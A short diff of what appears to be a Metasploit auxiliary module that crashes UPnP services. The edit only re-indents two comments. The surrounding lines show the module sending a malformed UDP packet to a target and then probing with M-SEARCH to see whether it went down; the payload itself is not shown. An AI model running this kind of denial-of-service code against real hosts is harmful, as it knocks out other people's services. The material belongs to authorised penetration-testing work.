@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-    # the M-SEARCH probe packet that tries to identify whether the service is up or not
+		# the M-SEARCH probe packet that tries to identify whether the service is up or not
 		msearch_probe = "M-SEARCH * HTTP/1.1\r\n"
 		msearch_probe << "Host:239.255.255.250:1900\r\n"
 		msearch_probe << "ST:upnp:rootdevice\r\n"
@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("#{rhost}:#{rport} - Sending malformed packet...")
 			udp_sock.put(sploit)
 
-      # send the probe to the target
+			# send the probe to the target
 			print_status("#{rhost}:#{rport} - The target should be unresponsive now...")
 			response = send_probe(udp_sock, msearch_probe)
 			if response.nil?
